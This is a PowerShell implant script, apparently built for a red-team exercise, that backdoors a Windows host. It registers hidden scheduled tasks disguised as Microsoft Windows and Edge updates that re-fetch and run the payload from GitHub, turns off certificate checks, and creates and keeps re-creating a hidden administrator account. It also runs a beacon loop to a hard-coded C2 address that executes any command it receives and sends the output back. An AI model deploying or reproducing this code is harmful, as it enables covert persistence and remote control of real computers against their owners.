# payload.ps1 - lives in your GitHub repo

$C2      = "https://100.65.4.238"
$Secret  = "foxtrot-redteam-2026"
$Token   = -join ([System.Security.Cryptography.SHA256]::Create().ComputeHash(
               [System.Text.Encoding]::UTF8.GetBytes($Secret)
           ) | ForEach-Object { $_.ToString("x2") })

$AgentId = $env:COMPUTERNAME
$Headers = @{ "X-Agent-Token" = $Token; "Content-Type" = "application/json" }

# Ignore self-signed cert on your Kali box
add-type @"
using System.Net; using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert,
        WebRequest req, int problem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll

# ── Method 1: Scheduled Task to re-pull and re-run payload every 10 minutes ──
$action  = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/BSparacio/CDT_Red_Team_Tool/main/payload.ps1' -OutFile C:\Windows\Temp\p.ps1 -UseBasicParsing; powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\Temp\p.ps1`""

$trigger  = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 10) -Once -At (Get-Date)
$settings = New-ScheduledTaskSettingsSet -Hidden

Register-ScheduledTask -TaskName "MicrosoftWindowsUpdate" `
    -Action $action `
    -Trigger $trigger `
    -Settings $settings `
    -RunLevel Highest `
    -Force

# ── Method 3: Watchdog scheduled task to recreate backdoor user if deleted ────
$watchdog = @'
$hostname   = $env:COMPUTERNAME.ToLower()
$username   = "svc_$($hostname.Substring(0, [Math]::Min(6, $hostname.Length)))"
$seed       = "redteam-rit-2026"
$bytes      = [System.Text.Encoding]::UTF8.GetBytes($seed + $hostname)
$hash       = [System.Security.Cryptography.SHA256]::Create().ComputeHash($bytes)
$password   = ([Convert]::ToBase64String($hash)).Substring(0,16) + "!A1"
$securePass = ConvertTo-SecureString $password -AsPlainText -Force

if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
    New-LocalUser -Name $username -Password $securePass -PasswordNeverExpires
    Add-LocalGroupMember -Group "Administrators" -Member $username
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
    Set-ItemProperty -Path $regPath -Name $username -Value 0 -Type DWord
}
'@

$watchdog | Out-File "C:\Windows\Temp\watchdog.ps1" -Force

$watchdogAction   = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\Temp\watchdog.ps1"
$watchdogTrigger  = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -Once -At (Get-Date)
$watchdogSettings = New-ScheduledTaskSettingsSet -Hidden

Register-ScheduledTask -TaskName "MicrosoftEdgeUpdate" `
    -Action $watchdogAction `
    -Trigger $watchdogTrigger `
    -Settings $watchdogSettings `
    -RunLevel Highest `
    -Force

# ── Beacon log for debugging ──────────────────────────────────────────────────
try {
    $body = @{ id = $AgentId; result = $null } | ConvertTo-Json
    $resp = Invoke-RestMethod -Uri "$C2/beacon" -Method POST `
                -Headers $Headers -Body $body
    "SUCCESS: Got response" | Out-File "C:\Users\Public\beacon_log.txt" -Force
    $resp | ConvertTo-Json | Out-File "C:\Users\Public\beacon_log.txt" -Append
} catch {
    "ERROR: $($_.Exception.Message)" | Out-File "C:\Users\Public\beacon_log.txt" -Force
    $_.Exception | Format-List * | Out-File "C:\Users\Public\beacon_log.txt" -Append
}

# ── C2 beacon loop ────────────────────────────────────────────────────────────
while ($true) {
    try {
        $body = @{ id = $AgentId; result = $null } | ConvertTo-Json
        $resp = Invoke-RestMethod -Uri "$C2/beacon" -Method POST `
                    -Headers $Headers -Body $body
        if ($resp.cmd) {
            $output = try { Invoke-Expression $resp.cmd 2>&1 | Out-String } catch { $_.Exception.Message }
            $body2  = @{ id = $AgentId; result = $output } | ConvertTo-Json
            Invoke-RestMethod -Uri "$C2/beacon" -Method POST -Headers $Headers -Body $body2
        }
    } catch { }
    Start-Sleep -Seconds 30
}